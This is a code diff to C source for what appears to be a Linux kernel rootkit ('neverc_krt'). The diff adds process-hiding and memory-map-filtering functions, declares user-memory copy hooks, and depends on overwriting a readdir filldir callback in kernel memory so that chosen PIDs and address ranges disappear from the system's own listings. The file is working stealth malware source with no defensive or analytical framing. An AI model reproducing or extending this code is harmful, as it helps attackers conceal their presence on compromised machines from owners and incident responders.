@@ -4,6 +4,14 @@
 #define _NEVERC_KRT_SKC_DPORT_OFF NEVERC_KRT_SKC_DPORT_OFF
 #define _NEVERC_KRT_SKC_NUM_OFF   NEVERC_KRT_SKC_NUM_OFF
 
+/* Forward declarations for cross-file variables (defined in nvk_mem.c) */
+typedef unsigned long (*neverc_krt_copy_from_user_fn)(void *to, const void __user *from,
+						      unsigned long n);
+typedef unsigned long (*neverc_krt_copy_to_user_fn)(void __user *to, const void *from,
+						    unsigned long n);
+extern neverc_krt_copy_from_user_fn _neverc_krt_copy_from_user;
+extern neverc_krt_copy_to_user_fn   _neverc_krt_copy_to_user;
+
 /* Cross-file hook state, accessed by neverc_krt_cleanup_all() in nvk.c */
 struct neverc_krt_hook _neverc_krt_ks_hook;
 int _neverc_krt_ks_hooked;
@@ -83,6 +91,11 @@ struct neverc_krt_file_spoof_entry {
 
 /* ---- internal variables (file-local) ---- */
 
+static struct neverc_krt_pid_hide_state _neverc_krt_pid_state;
+
+static struct neverc_krt_maps_filter_region _neverc_krt_maps_regions[NEVERC_KRT_MAPS_FILTER_MAX];
+static int _neverc_krt_maps_region_count;
+
 static neverc_krt_mutex_lock_fn   _neverc_krt_hide_mutex_lock;
 static neverc_krt_mutex_unlock_fn _neverc_krt_hide_mutex_unlock;
 static void                      *_neverc_krt_module_mutex;
@@ -150,19 +163,6 @@ static int                        _neverc_krt_file_spoof_cnt;
 static int                        _neverc_krt_file_dentry_probed;
 
 #define _NEVERC_KRT_DENTRY_DNAME_NAME_OFF NEVERC_KRT_DENTRY_DNAME_OFF
-
-static __always_inline unsigned long _neverc_krt_get_file_dentry_off(void)
-{
-	unsigned long off = __atomic_load_n(&_neverc_krt_file_dentry_off,
-					    __ATOMIC_ACQUIRE);
-	if (off)
-		return off;
-
-	int kv = __atomic_load_n(&_neverc_krt_kernel_ver, __ATOMIC_ACQUIRE);
-	if (!kv)
-		return _neverc_krt_file_dentry_off_for(NEVERC_KRT_KERNEL);
-	return _neverc_krt_file_dentry_off_for(kv);
-}
 
 int neverc_krt_hide_init(void)
 {
@@ -438,7 +438,7 @@ static int _neverc_krt_atoi(const char *s, int len)
 	return val;
 }
 
-int _neverc_krt_pid_is_hidden(int pid)
+static int _neverc_krt_pid_is_hidden(int pid)
 {
 	int i;
 	for (i = 0; i < _neverc_krt_pid_state.count; i++) {
@@ -533,6 +533,22 @@ static void _neverc_krt_pid_readdir_ctx(neverc_krt_reg_ctx *ctx)
 
 	neverc_krt_filldir_fn wrap = _neverc_krt_pid_filldir_wrap;
 	neverc_krt_mem_write((void *)dir_ctx_ptr, &wrap, 8);
+}
+
+int neverc_krt_pid_should_hide(int pid)
+{
+	return _neverc_krt_pid_is_hidden(pid);
+}
+
+int neverc_krt_maps_should_hide(unsigned long addr)
+{
+	int i;
+	for (i = 0; i < _neverc_krt_maps_region_count; i++) {
+		if (addr >= _neverc_krt_maps_regions[i].start &&
+		    addr < _neverc_krt_maps_regions[i].end)
+			return 1;
+	}
+	return 0;
 }
 
 int neverc_krt_pid_hide_add(int pid)
